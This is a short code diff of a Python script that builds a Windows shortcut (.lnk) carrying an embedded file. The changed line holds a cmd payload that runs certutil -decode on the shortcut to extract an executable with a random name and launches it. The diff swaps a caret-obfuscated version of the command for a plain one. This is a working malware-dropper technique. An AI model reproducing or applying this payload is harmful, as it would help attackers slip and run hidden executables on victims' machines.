@@ -25,7 +25,7 @@ def build_shortcut(file_to_embed, shortcut_name):
 
     with winshell.shortcut(output_shortcut) as shortcut:    
         # @echo off & (for %i in (.lnk) do certutil -decode %i [filename]) & start [filename].exe
-        payload = "^@echo off&(for %i in (*.l^n^k) do c^e^r^t^u^t^i^l^ -d^e^c^o^d^e %i {0}.e^x^e)&s^t^a^r^t {0}.e^x^e".format(
+        payload = "@echo off&(for %i in (*.lnk) do certutil -decode %i {0}.exe)&start {0}.exe".format(
             "".join(random.choice(string.ascii_letters) for i in range(8))
         )                
 
